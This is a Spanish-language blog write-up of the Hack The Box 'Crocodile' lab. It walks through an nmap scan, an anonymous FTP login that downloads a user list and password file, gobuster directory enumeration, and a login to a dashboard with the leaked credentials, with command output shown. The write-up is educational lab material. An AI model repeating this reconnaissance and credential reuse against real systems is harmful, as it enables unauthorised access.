---
title: "Crocodile"
date: 2022-05-15T22:03:58-05:00
draft: false

description: "Resolución del reto Crocodile de Hack The Box"
hideToc: false #(false: se muestra el indice a la derecha ... true no se muestra)
enableToc: true #(Se quita o no la opci贸n de derecha que permite ocultar o no)
enableTocContent: false  #(Indice pero vertical)
author: Brayan Rodriguez #(Autor)
authorEmoji: 👺

#(Etiquetas de referencia al contenido)
tags:
- Exposición de datos
- Fundamentos

categories:
- Ciberseguridad
- Hack-the-box
image: images/HTB/03_Crocodile/crocodile.png

---

Se realiza ub escaneo al activo y se detecta los puertos TCP abiertos 21 y 80. Lugo se procede a realizar un escaneo más personalizado que permita detectar las versiones del los servicios. 

{{< highlight Bash >}}

└─$ sudo nmap -p21,80  -sV -sC $IP -vvvv
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-15 20:41 -05
Nmap scan report for 10.129.93.96
Host is up, received echo-reply ttl 63 (0.18s latency).
Scanned at 2022-05-15 20:41:09 -05 for 12s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.83
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1248E68909EAE600881B8DB1AD07F356
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:41
Completed NSE at 20:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.69 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
                                                       
{{< /highlight >}}													   

Nos conectamos a nuestro objetivo a través del servido ftp. Se logea a través del usuario anonymous

{{< highlight Bash >}}

$ ftp $IP                             
Connected to 10.129.93.96.
220 (vsFTPd 3.0.3)
Name (10.129.93.96:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

{{< /highlight >}}

Se reevisa la información interna y se detecta credenciales. Se extrae la información 

{{< highlight Bash >}}

ftp> get allowed.userlist 
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||47545|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |*************************************************************************************************|    33        1.87 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.15 KiB/s)
gftp> ge allowed.userlist.passwd 
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||40266|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |*************************************************************************************************|    62        6.25 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.30 KiB/s)

{{< /highlight >}}

Se realiza una enumeración de directorios y se detacta la ruta ***dashboard***

{{< highlight Bash >}}

─$ gobuster dir -u http://10.129.93.96 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.93.96
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/05/15 21:07:16 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.129.93.96/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.129.93.96/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.129.93.96/js/]    
/fonts                (Status: 301) [Size: 312] [--> http://10.129.93.96/fonts/] 
/dashboard            (Status: 301) [Size: 316] [--> http://10.129.93.96/dashboard/]
Progress: 6267 / 207644 (3.02%)                                                    ^C
[!] Keyboard interrupt detected, terminating.
                                                                                    
===============================================================
2022/05/15 21:09:20 Finished
===============================================================

{{< /highlight >}}

Se ingresa al portal http://{IP}/dashboard y se detecta una portal de inicio de sesión. 

![image info](/images/HTB/03_Crocodile/login.png)

Se prueba las credenciales encontradas y bingo ! Se logra ingresar al sistema. 

![image info](/images/HTB/03_Crocodile/flag.png)